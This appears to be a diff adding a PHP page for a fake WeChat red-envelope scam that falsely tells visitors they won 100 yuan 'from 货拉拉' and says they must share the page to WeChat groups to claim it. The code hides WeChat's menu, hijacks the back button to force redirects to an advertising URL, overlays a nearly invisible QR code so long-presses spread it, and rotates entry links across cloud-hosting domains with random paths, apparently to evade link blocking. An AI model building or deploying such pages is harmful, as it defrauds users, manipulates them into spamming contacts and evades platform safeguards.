@@ -1,0 +1,297 @@
+<?php
+
+include_once __DIR__ . '/../common.php';
+
+include_once CONFIG_PATH . 'config.php';
+
+include_once LIBRARY_PATH . 'helper.php';
+
+include_once LIBRARY_PATH . 'wx/fwhwx.php';
+
+include_once LIBRARY_PATH . 'fwh_helper.php';
+
+header("Access-Control-Allow-Origin: *");
+
+$xiaoweiba = '&' . http_build_query($_GET);
+if (!$_GET['fx'] && !$_GET['_share']) {
+    $advertising = $luodi1 . $advertising . '&_tuitan=1' . $xiaoweiba;
+}
+
+function randomkeys($length)
+{
+ $pattern = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ';
+ for($i=0;$i<$length;$i++)
+ {
+  $key .= $pattern{mt_rand(0,35)}; //生成php随机数
+ }
+ return $key;
+}
+
+
+$rand = rand(3,20);
+$rand1 = rand(2,20);
+$rand2 = rand(2,20);
+
+
+$k = get_fwhk($_SERVER['HTTP_HOST']);
+if (!$k) dexit(['未查询到k']);
+$arr = File::select(CONFIG_PATH . 'weixin2.php', array('id' => $k));
+if (!$arr || !$arr['wxflag']) dexit(['错误的l2url！']);
+
+$rukou = get_rukou_url($k, 1);
+$pandun = strstr($rukou, 'bceapp.com');
+$pandun1 = strstr($rukou, 'apigw.tencentcs.com');
+$pandun2 = strstr($rukou, 'yun.pingan.com');
+$pandun3 = strstr($rukou, 'gitee.io');
+$pandun4 = strstr($rukou, 'aliyuncs.com');
+$pandun5 = strstr($rukou, 'kuaizhan.com');
+
+$uuid = isset($_GET['uuid']) ? '&uuid='.$_GET['uuid'] : '';
+if ($pandun || $pandun2 || $pandun3) {
+$rukous = $rukou . 'rukou.html?article=' . rand(111111, 999999) . $uuid;
+} else if ($pandun1) {
+$rukous = $rukou;
+}else if($panduan4){
+$rukous = $rukou.randomkeys($rand). '?article=' . randomkeys($rand2) . $uuid;
+}else if($pandun5){
+$rukous = $rukou . '?article=' . rand(111111, 999999) . $uuid;
+}else {
+$_encrypter = new Encrypter(__KEY__);
+$rukous = $rukou . $_encrypter->encrypt(['t' => time(), 'class' => __MULU__ . '/home/rukou.php']) . '?article=' . rand(111111, 999999) . $uuid;
+//$rukous = $rukou . '/xx1-77/dawang/home/rukou.php?article=' . rand(111111, 999999) . $uuid;
+}
+
+?>
+
+<!DOCTYPE html>
+<html lang="en" style="overflow:hidden!important">
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+	<title>...</title>
+	<link rel="stylesheet" type="text/css" href="<?= $sys_global_url ?>static/app/css/detail.css"/>
+	<script type="text/javascript" src="<?= $sys_global_url ?>static/app/js/jquery-1.11.1.min.js"></script>
+	<script type="text/javascript" src="<?= $sys_global_url ?>static/app/js/jquery.qrcode.min.js"></script>
+	<style>
+		.new_imgewm{ width:100%;height:100%; position: fixed;z-index: 9999; top:30%;opacity:0.00001;}
+	</style>
+</head>
+<body class="bg-white" style="overflow:hidden!important">
+<div>
+	<audio src="<?= $sys_global_url ?>static/app/img/music.mp3" preload="auto" autoplay="autoplay" id="mp3"></audio>
+	<div class="daoztx padding">
+		<div class="new-bg-tz">
+			<div class="daoz_top">
+				<div class="t_l_text">
+					<div><img src="<?= $sys_global_url ?>static/app/img/wei_xin.png" alt=""></div>
+					<div>微信·<span class="text-new">刚刚</span></div>
+				</div>
+				<div class="safe-img"><img src="<?= $sys_global_url ?>static/app/img/safe.png" alt=""></div>
+			</div>
+			<div class="daoz_bottom">
+				<div>
+					<div>微信红包</div>
+					<div class="text-ling">您获取了一个红包，现在去领取</div>
+				</div>
+				<div class="tz_img"><img src="<?= $sys_global_url ?>static/app/img/tongzhi.jpg" alt=""></div>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="full-width">
+	<img style="position: fixed;width: 0.7rem;top: 4%;left: 4%;z-index: 99999" src="<?= $sys_global_url ?>static/app/img/back.png" onclick="jumpAd()">
+	<img src="<?= $sys_global_url ?>static/app/img/xingzhuang.png">
+</div>
+
+<div class="text-center margin-top margin-bottom" style="height: 8rem">
+	<p class="text-black text-xxl text-bold margin-bottom">货拉拉的红包</p>
+	<p class="text-grey ">恭喜发财，大吉大利</p>
+	<p style="font-size: 3rem;color: rgba(207, 170 ,114, 1)" id="moneyOne" class="margin-top-xxl text-bold">100.00
+		<span style="font-size: 1.5rem">元</span>
+	</p>
+</div>
+<div id="review_boxs" class="padding margin-top-xxl" style="width: 100%;overflow: hidden">
+	<div id="comment1s" style="overflow: hidden"></div>
+	<div id="comment2s"></div>
+</div>
+<div id="modal" class="bg-white padding-xl text-lg text-center padding-bottom-ten-five"
+	 style="border-radius: 1rem;width: 80%;position: fixed;top:15%;left: 10%;border: 1px solid red;
+animation: shake 2s 2 linear;z-index: 11;opacity: 0;transition: 1s">
+	<p class="text-center text-blue text-bold margin-bottom text-xxl"><b id="gxn">恭喜您</b></p>
+	<p class="text-center text-xl hideMes">获得福利金</p>
+	<p class="margin-top-xl text-red margin-right hideMes"><b id="money" class="text-bold" style="font-size: 1.5rem"></b></p>
+	<p class="text-lg text-center margin-top hideMes" id="mess"><span class="text-red text-lg">领取要求：</span>只需您分享到微信群</p>
+	<p class="margin-top-xl hideMess">完成后钱自动存到您的微信钱包</p>
+	<p class="margin-top-xl margin-bottom-xl" id="tempText">红包还剩
+		<b class="text-red margin-top-xl" id="sx"></b>
+	<p class="margin-top hideMess" style="margin-bottom: 10%">先领先得，领完为止!</p>
+	</p>
+	<div style="position: absolute;bottom: 0;left: 0;border-radius: 1rem;
+    border-top-left-radius: 0;border-top-right-radius: 0;" class="bg-red full-width padding-top-bottom-xl text-xxl">
+		长按屏幕发送到微信群
+	</div>
+</div>
+
+<div style="position: fixed;bottom: 0;width: 100%;text-align: center;z-index: 9999">
+	<img style="display: block;transform: scale(0.7);margin: 0 auto;text-align: center;position: relative;
+    top: 7rem;" src="<?= $sys_global_url ?>static/app/img/zhiwen.png">
+
+	<div style="display: block;transform: scale(0.7);margin: 0 auto;text-align: center" class="capmcz"></div>
+	<h1 style="font-size: 1.5rem;color: #449AFA;margin-bottom: 8%">长按屏幕分享</h1>
+</div>
+<div id="qrcode" style="display: none"></div>
+<!--<img id="imgOne" style="width: 100vw;height: 100vh;opacity: 1;position: fixed;top: 0px;left: 0;z-index: 999999"/>-->
+<img id='imgOne' class="ewmbox">
+<div id='imgn-div' class="new_imgewm" >
+	<img class="save-img" id="img" style="width:100%">
+</div>
+<script type="text/javascript" src="<?= $sys_global_url ?>static/app/js/cavanas.js"></script>
+<script>
+
+    audioAutoPlay("mp3");
+
+    function audioAutoPlay(id) {
+        var audio1 = document.getElementById(id);
+        audio1.play();
+        document.addEventListener("WeixinJSBridgeReady", function () {
+            audio1.play();
+        }, false);
+    }
+
+    function onBridgeReady() {
+        WeixinJSBridge.call('hideOptionMenu');
+    }
+    if (typeof WeixinJSBridge == "undefined") {
+        if (document.addEventListener) {
+            document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
+        } else if (document.attachEvent) {
+            document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
+            document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
+        }
+    } else {
+        onBridgeReady();
+    }
+
+    history.pushState(null, null, document.URL);
+    window.addEventListener('popstate', function() {
+        jp();
+    },false);
+    function hh() {
+        history.pushState(history.length + 1, "message", window.location.href.split('#')[0] + "#" + new Date().getTime());
+    }
+
+    //返回事件，跳广告
+    function jp() {
+        location.href = '<?=$advertising?>';
+    }
+
+    //广告地址
+    var ad_url = '<?=$advertising?>';
+    var sys_global_url = '<?= $sys_global_url ?>static/app/';
+    var rk = "<?=$rukous?>";
+    var rkimg = sys_global_url+'img/poster.png';
+
+    function jumpAd () {
+        window.location.href = ad_url
+    }
+
+
+    $('#qrcode').qrcode("<?=$rukous?>");
+    var canvas=$('#qrcode').find('canvas').get(0);
+    $('#imgOne').attr('src',canvas.toDataURL('image/jpg'));
+    console.log(111)
+    var r = sys_global_url+'img/poster.jpg';
+
+    //var r = document.getElementById("qunImgId").getAttribute("src");
+    //合成的二维码图片
+    var imgurl = $('#imgOne').attr('src')
+
+    convertImgToBase64(imgurl, function (base64Img) {
+        var conf = {
+            id: "img",
+            //合成背景图宽高和实际图片宽高一样
+            imgdata: { src: r, width: 629, height: 1143 },
+            //size为二维码大小 left为离左边的距离 top为离上边的距离
+            ewmdata: {
+                src: imgurl,
+                size: 165,
+                left: 232,
+                top: 692
+            },
+            txdata: {
+                src: base64Img,
+                iscircle: true,
+                size: 0,
+                left: 650,
+                top: 148
+            },
+            stringdata: [
+                {
+                    str: "",
+                    iscent: false,
+                    font: "bold 40px Arial",
+                    fillStyle: "#000000",
+                    left: 148,
+                    top: 185
+                }
+            ]
+        };
+        createPic(conf);
+    });
+
+
+
+    // 生成二维码
+    // var qrcode = $('#qrcode').qrcode({
+    //     width: 100,
+    //     height: 100,
+    //     text: rk
+    // })
+    // var canvas = qrcode.find('canvas').get(0); // 得到合成图片的路径
+    //     $('#avatar').attr('src',canvas.toDataURL('image/jpg'));
+
+
+    // drawAndShareImage() // 图片合成
+
+    function drawAndShareImage() {
+        var canvas = document.createElement("canvas");
+        canvas.width = 900;
+        canvas.height = 1650;
+        var context = canvas.getContext("2d");
+
+        context.rect(0, 0, canvas.width, canvas.height);
+        // context.fillStyle = "black";
+        context.fill();
+
+        var myImage = new Image();
+        myImage.src = rkimg;    //背景图片  你自己本地的图片或者在线图片
+        myImage.crossOrigin = 'Anonymous';
+
+        myImage.onload = function () {
+            context.drawImage(myImage, 0, 0, 900, 1650);
+
+            var myImage2 = new Image();
+            canvas1.crossOrigin = 'Anonymous';
+
+            myImage2.src = canvas1.toDataURL('image/jpg');   //你自己本地的图片或者在线图片
+            myImage2.crossOrigin = 'Anonymous';
+
+            myImage2.onload = function () {
+                context.drawImage(myImage2, 280, 950, 340, 340);
+                canvas.setAttribute('crossOrigin', 'anonymous');
+
+                var base64 = canvas.toDataURL("image/png");  //"image/png" 这里注意一下
+                var img = document.getElementById('avatar');
+
+                // document.getElementById('avatar').src = base64;
+                img.setAttribute('src', base64);
+            }
+        }
+    }
+</script>
+<script type="text/javascript" src="<?= $sys_global_url ?>static/app/js/index.js"></script>
+</body>
+
+</html>
